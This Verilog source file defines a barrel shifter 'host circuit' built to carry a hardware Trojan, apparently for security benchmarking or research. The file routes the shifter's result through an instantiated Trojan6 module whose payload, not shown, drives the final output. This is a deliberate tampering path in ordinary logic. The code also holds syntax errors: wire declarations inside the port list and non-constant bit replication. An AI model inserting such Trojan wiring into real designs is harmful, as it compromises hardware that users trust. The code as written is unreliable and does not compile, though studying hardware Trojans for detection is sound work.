// Barrel Shifter Host Circuit for Trojan6
// Interface: m0_data_o[31:0], i_s15_data_o[31:0] -> i_s15_data_o_TrojanPayload[31:0]
module trojan6_barrel_shifter_host #(
    parameter DATA_WIDTH = 32,
    parameter SHIFT_BITS = 5
)(
    input wire clk,
    input wire rst,
    input wire [DATA_WIDTH-1:0] data_in,
    input wire [SHIFT_BITS-1:0] shift_amount,
    input wire [1:0] shift_type, // 00: left, 01: right logical, 10: right arithmetic, 11: rotate
    input wire shift_enable,
    output reg [DATA_WIDTH-1:0] data_out,
    output reg shift_valid,
    output reg shift_overflow,
    
    // Internal trojan signals
    wire [31:0] trojan_m0_data_o;
    wire [31:0] trojan_i_s15_data_o;
    wire [31:0] trojan_i_s15_data_o_TrojanPayload
);

    // Barrel shifter internal logic
    reg [DATA_WIDTH-1:0] shift_result;
    reg [DATA_WIDTH-1:0] data_reg;
    reg [SHIFT_BITS-1:0] shift_reg;
    reg [1:0] type_reg;
    reg [7:0] operation_counter;
    
    // Generate trojan input signals
    assign trojan_m0_data_o = (DATA_WIDTH >= 32) ? data_in[31:0] : {{(32-DATA_WIDTH){1'b0}}, data_in};
    assign trojan_i_s15_data_o = (DATA_WIDTH >= 32) ? shift_result[31:0] : {{(32-DATA_WIDTH){1'b0}}, shift_result};
    
    // Pipeline input registers
    always @(posedge clk or posedge rst) begin
        if (rst) begin
            data_reg <= {DATA_WIDTH{1'b0}};
            shift_reg <= {SHIFT_BITS{1'b0}};
            type_reg <= 2'b00;
            operation_counter <= 8'b0;
        end else if (shift_enable) begin
            data_reg <= data_in;
            shift_reg <= shift_amount;
            type_reg <= shift_type;
            operation_counter <= operation_counter + 1;
        end
    end
    
    // Multi-stage barrel shifter logic
    always @(*) begin
        case (type_reg)
            2'b00: begin // Left shift
                shift_result = data_reg << shift_reg;
            end
            2'b01: begin // Right logical shift
                shift_result = data_reg >> shift_reg;
            end
            2'b10: begin // Right arithmetic shift
                shift_result = $signed(data_reg) >>> shift_reg;
            end
            2'b11: begin // Rotate right
                shift_result = (data_reg >> shift_reg) | (data_reg << (DATA_WIDTH - shift_reg));
            end
            default: shift_result = data_reg;
        endcase
    end
    
    // Output logic with trojan integration
    always @(posedge clk or posedge rst) begin
        if (rst) begin
            data_out <= {DATA_WIDTH{1'b0}};
            shift_valid <= 1'b0;
            shift_overflow <= 1'b0;
        end else begin
            shift_valid <= shift_enable;
            
            // Integrate trojan payload into output
            if (DATA_WIDTH >= 32) begin
                data_out <= {{(DATA_WIDTH-32){1'b0}}, trojan_i_s15_data_o_TrojanPayload};
            end else begin
                data_out <= trojan_i_s15_data_o_TrojanPayload[DATA_WIDTH-1:0];
            end
            
            // Overflow detection for shifts
            case (type_reg)
                2'b00: begin
                    if (shift_reg >= DATA_WIDTH)
                        shift_overflow <= 1'b1;
                    else if (shift_reg == 0)
                        shift_overflow <= 1'b0;
                    else
                        shift_overflow <= (data_reg[DATA_WIDTH-1:DATA_WIDTH-shift_reg] != 0);
                end
                2'b01, 2'b10: shift_overflow <= (shift_reg >= DATA_WIDTH);
                2'b11: shift_overflow <= 1'b0; // Rotate never overflows
                default: shift_overflow <= 1'b0;
            endcase
        end
    end
    
    // Additional barrel shifter features
    reg [DATA_WIDTH-1:0] mask_result;
    always @(*) begin
        // Generate mask with bounds checking to avoid negative repeat factors
        if (shift_reg == 0)
            mask_result = {DATA_WIDTH{1'b1}};
        else if (shift_reg >= DATA_WIDTH)
            mask_result = {DATA_WIDTH{1'b0}};
        else
            mask_result = {{shift_reg{1'b0}}, {(DATA_WIDTH-shift_reg){1'b1}}};
    end
    
    // Performance counters
    reg [15:0] left_shift_count, right_shift_count, rotate_count;
    always @(posedge clk or posedge rst) begin
        if (rst) begin
            left_shift_count <= 16'b0;
            right_shift_count <= 16'b0;
            rotate_count <= 16'b0;
        end else if (shift_enable) begin
            case (type_reg)
                2'b00: left_shift_count <= left_shift_count + 1;
                2'b01, 2'b10: right_shift_count <= right_shift_count + 1;
                2'b11: rotate_count <= rotate_count + 1;
                default: ;
            endcase
        end
    end
    
    // Instantiate Trojan6
    Trojan6 trojan_inst (
        .m0_data_o(trojan_m0_data_o),
        .i_s15_data_o(trojan_i_s15_data_o),
        .i_s15_data_o_TrojanPayload(trojan_i_s15_data_o_TrojanPayload)
    );

endmodule
